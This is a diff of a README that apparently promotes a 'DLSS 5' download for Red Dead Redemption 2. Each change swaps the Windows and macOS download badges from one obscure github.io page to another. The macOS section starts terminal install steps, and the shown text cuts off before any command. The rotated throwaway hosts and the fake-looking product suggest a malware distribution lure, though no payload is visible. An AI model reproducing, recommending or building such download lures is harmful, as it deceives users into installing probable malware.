@@ -21,7 +21,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Red%20Dead%20Redemption%202_DLSS_5-F9A825?style=for-the-badge&logo=github)](https://phantommofence.github.io/download-win/)
+[![Download](https://img.shields.io/badge/⬇_Download_Red%20Dead%20Redemption%202_DLSS_5-F9A825?style=for-the-badge&logo=github)](https://beatowlrouse.github.io/windownload/)
 
 </div>
 
@@ -54,9 +54,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://phantommofence.github.io/download-win/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://phantommofence.github.io/download-mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
 
 </div>
 
@@ -70,7 +70,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_DLSS_5_for_Red%20Dead%20Redemption%202-F9A825?style=for-the-badge&logo=github)](https://phantommofence.github.io/download-win/)
+[![Download](https://img.shields.io/badge/⬇_Download_DLSS_5_for_Red%20Dead%20Redemption%202-F9A825?style=for-the-badge&logo=github)](https://beatowlrouse.github.io/windownload/)
 
 </div>
 
@@ -102,7 +102,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://phantommofence.github.io/download-mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
